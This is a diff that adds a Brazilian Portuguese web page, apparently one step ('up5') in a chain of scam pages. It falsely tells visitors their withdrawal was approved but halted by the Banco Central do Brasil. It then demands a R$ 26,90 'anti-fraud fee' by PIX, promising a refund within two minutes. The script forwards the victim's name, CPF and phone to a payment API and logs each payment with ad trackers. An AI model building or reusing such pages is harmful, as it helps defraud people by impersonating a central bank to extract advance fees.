@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script>
+  window.pixelId = "69a64ea97bd1ecfa7e6be10c";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Tarifa Anti-fraude</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap">
+  <script src="/js/fb-tracking.js"></script>
+  <style>
+    body { font-family: "Inter", sans-serif; margin: 0; padding: 0; background: #f4f6f9; color: #333; text-align: center; }
+    header { background: #0eab3f; color: #fff; padding: 1rem 0; }
+    header h1 { margin: 0; font-size: 1.5rem; }
+    .content { max-width: 600px; margin: 2rem auto; padding: 1rem; background: #fff; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+    .content img { width: 100px; margin: 1rem 0; }
+    .content h2 { font-size: 1.8rem; color: #0eab3f; margin-bottom: 1rem; }
+    .content p { line-height: 1.6; }
+    .content .highlight { font-weight: bold; color: #0eab3f; }
+    .button { display: inline-block; margin-top: 1.5rem; padding: 0.8rem 1.5rem; font-size: 1rem; font-weight: bold; color: #fff; background: #0eab3f; border: none; border-radius: 25px; cursor: pointer; }
+    .button:hover { background: #09912e; }
+    .up5-pix-box { display: none; margin-top: 1.5rem; padding: 1rem; background: #f9fafb; border: 1px solid #e5e7eb; border-radius: 10px; text-align: center; }
+    .up5-pix-box.show { display: block; }
+    .up5-pix-code { font-size: 11px; word-break: break-all; max-height: 70px; overflow: auto; padding: 8px; background: #fff; border-radius: 8px; margin: 10px 0; border: 1px solid #e5e7eb; }
+    .up5-pix-actions { display: flex; gap: 8px; justify-content: center; margin-top: 8px; }
+    .up5-pix-actions button { padding: 10px 16px; border-radius: 8px; border: 1px solid #d1d5db; background: #f9fafb; font-weight: 600; cursor: pointer; }
+    .up5-timer { font-size: 12px; color: #4b5563; margin-top: 8px; }
+    .up5-status { margin-top: 8px; font-size: 12px; padding: 8px; border-radius: 8px; display: none; }
+    .up5-status.show { display: block; }
+    .up5-status.ok { background: #ecfdf3; color: #166534; }
+    .up5-status.error { background: #fef2f2; color: #b91c1c; }
+    footer { margin-top: 2rem; font-size: 0.9rem; color: #666; }
+  </style>
+</head>
+<body>
+  <header><h1>ATENÇÃO</h1></header>
+
+  <div class="content">
+    <img src="images/logo-pix-icone-1024.png" alt="Pix">
+    <h2>Saque aprovado com sucesso!</h2>
+    <p>
+      <strong>Seu saldo foi enviado</strong>, mas a transferência foi interrompida pelo
+      <span class="highlight">Banco Central do Brasil</span>.
+    </p>
+    <p>
+      Para garantir a segurança e evitar fraudes, é necessário pagar uma
+      <span class="highlight">tarifa simbólica anti-fraude</span>. Este valor
+      será extornado em até <strong>2 minutos</strong> após o pagamento.
+    </p>
+    <p>
+      <strong>Valor da tarifa:</strong>
+      <span class="highlight">R$ 26,90</span>
+    </p>
+    <button id="paymentButton" class="button">Pagar Tarifa e Desbloquear Saldo</button>
+
+    <div id="up5PixBox" class="up5-pix-box">
+      <div id="up5Qrcode"></div>
+      <div id="up5PixCode" class="up5-pix-code">Aguardando código PIX...</div>
+      <div class="up5-pix-actions">
+        <button id="up5Copy">Copiar código</button>
+        <button id="up5Verify">Já paguei - Verificar</button>
+      </div>
+      <div class="up5-timer">Tempo restante: <span id="up5Timer">--:--</span></div>
+      <div id="up5Status" class="up5-status"></div>
+    </div>
+  </div>
+
+  <footer><p>© 2024 Pagamento Seguro. Todos os direitos reservados.</p></footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/qrcodejs2@0.0.2/qrcode.min.js"></script>
+  <script>
+    var API_CREATE = "../checkout/api/create-payment.php";
+    var API_CHECK = "../checkout/api/check-payment.php";
+    var SESSION_KEY = "up5CheckoutSessionId";
+    var POLL_INTERVAL_MS = 5000;
+    var POLL_MAX_MS = 10 * 60 * 1000;
+    var NEXT_URL = "../up6/index.html";
+    var AMOUNT_CENTS = 2690;
+
+    var params = new URLSearchParams(window.location.search);
+    var nome = (params.get("nome") || "Cliente").trim();
+    var cpf = (params.get("cpf") || "").replace(/\D/g, "");
+    var pixKey = (params.get("chave_pix") || params.get("cpf") || cpf).trim();
+    var leadPhone = (params.get("phone") || params.get("telefone") || "").replace(/\D/g, "");
+
+    var sessionId = localStorage.getItem(SESSION_KEY) || "";
+    var pollTimer = null;
+    var pollStartedAt = 0;
+    var expiresAtRaw = null;
+
+    function buildContact() {
+      var normalizedCPF = cpf || "cliente";
+      var email = (normalizedCPF + "@email.com").replace(/[^\w@.\-]/g, "");
+      var phone = leadPhone.length >= 10 ? leadPhone : "11999999999";
+      return { email: email, phone: phone };
+    }
+
+    function showStatus(text, type) {
+      var el = document.getElementById("up5Status");
+      if (!el) return;
+      el.textContent = text;
+      el.className = "up5-status show " + (type || "");
+    }
+
+    function renderQR(pixCode) {
+      var qrEl = document.getElementById("up5Qrcode");
+      if (!qrEl) return;
+      qrEl.innerHTML = "";
+      new QRCode(qrEl, { text: pixCode, width: 220, height: 220, correctLevel: QRCode.CorrectLevel.M });
+    }
+
+    function createPayment() {
+      var btn = document.getElementById("paymentButton");
+      if (btn) btn.disabled = true;
+
+      var contact = buildContact();
+      var storedUtms = typeof getStoredUtms === "function" ? getStoredUtms() : {};
+      if (typeof getFbp === "function" && getFbp()) storedUtms.fbp = getFbp();
+
+      var payload = {
+        session_id: sessionId || undefined,
+        name: nome,
+        document: cpf,
+        phone: contact.phone,
+        email: contact.email,
+        amount_cents: AMOUNT_CENTS,
+        pix_key: pixKey,
+        flow: "up5",
+        tracking_parameters: storedUtms,
+        source_url: window.location.href
+      };
+
+      fetch(API_CREATE, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).then(function(r) { return r.json(); }).then(function(data) {
+        if (!data.ok) throw new Error(data.error || "Falha ao gerar PIX.");
+        sessionId = data.session_id;
+        localStorage.setItem(SESSION_KEY, sessionId);
+        expiresAtRaw = data.expires_at || null;
+
+        if (typeof fbTrack === "function") {
+          fbTrack("InitiateCheckout", {
+            currency: "BRL",
+            value: AMOUNT_CENTS / 100,
+            content_name: "PIX up5",
+            content_ids: [data.payment_code]
+          }, { browserOnly: true });
+        }
+
+        document.getElementById("up5PixBox").classList.add("show");
+        renderQR(data.pix_qrcode_text);
+        document.getElementById("up5PixCode").textContent = data.pix_qrcode_text;
+        showStatus("PIX gerado. Realize o pagamento para continuar.", "ok");
+        startPolling();
+      }).catch(function(err) {
+        showStatus(err.message || "Erro ao gerar PIX.", "error");
+      }).finally(function() {
+        if (btn) btn.disabled = false;
+      });
+    }
+
+    function checkPayment() {
+      if (!sessionId) return Promise.resolve(null);
+      return fetch(API_CHECK + "?session_id=" + encodeURIComponent(sessionId), { method: "GET", headers: { "Accept": "application/json" } })
+        .then(function(r) { return r.json(); })
+        .then(function(data) { return data.ok ? data : null; });
+    }
+
+    function onPaid() {
+      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+      if (typeof fbTrack === "function") {
+        fbTrack("Purchase", { currency: "BRL", value: AMOUNT_CENTS / 100, content_name: "PIX up5" });
+      }
+      window.location.href = NEXT_URL + window.location.search;
+    }
+
+    function startPolling() {
+      pollStartedAt = Date.now();
+      pollTimer = setInterval(function() {
+        if (Date.now() - pollStartedAt > POLL_MAX_MS) {
+          clearInterval(pollTimer);
+          pollTimer = null;
+          showStatus("Tempo esgotado. Clique em 'Já paguei - Verificar'.", "error");
+          return;
+        }
+        checkPayment().then(function(data) {
+          if (data && data.status === "paid") onPaid();
+        });
+      }, POLL_INTERVAL_MS);
+    }
+
+    function updateTimer() {
+      var label = document.getElementById("up5Timer");
+      if (!label || !expiresAtRaw) { if (label) label.textContent = "--:--"; return; }
+      var d = new Date(expiresAtRaw.replace(" ", "T"));
+      if (isNaN(d.getTime())) { label.textContent = "--:--"; return; }
+      var diff = Math.max(0, d.getTime() - Date.now());
+      label.textContent = String(Math.floor(diff / 60000)).padStart(2, "0") + ":" + String(Math.floor((diff % 60000) / 1000)).padStart(2, "0");
+    }
+
+    document.getElementById("paymentButton").addEventListener("click", createPayment);
+    document.getElementById("up5Copy").addEventListener("click", function() {
+      var code = document.getElementById("up5PixCode").textContent || "";
+      if (!code || code.indexOf("Aguardando") === 0) return;
+      navigator.clipboard.writeText(code).then(function() { showStatus("Código copiado.", "ok"); });
+    });
+    document.getElementById("up5Verify").addEventListener("click", function() {
+      showStatus("Verificando...", "");
+      checkPayment().then(function(data) {
+        if (data && data.status === "paid") onPaid();
+        else showStatus("Ainda pendente. Aguarde a confirmação.", "");
+      }).catch(function() { showStatus("Erro ao verificar.", "error"); });
+    });
+
+    if (sessionId) {
+      document.getElementById("up5PixBox").classList.add("show");
+      showStatus("Sessão restaurada. Verificando pagamento...", "");
+      startPolling();
+    }
+    setInterval(updateTimer, 1000);
+    updateTimer();
+  </script>
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+</body>
+</html>
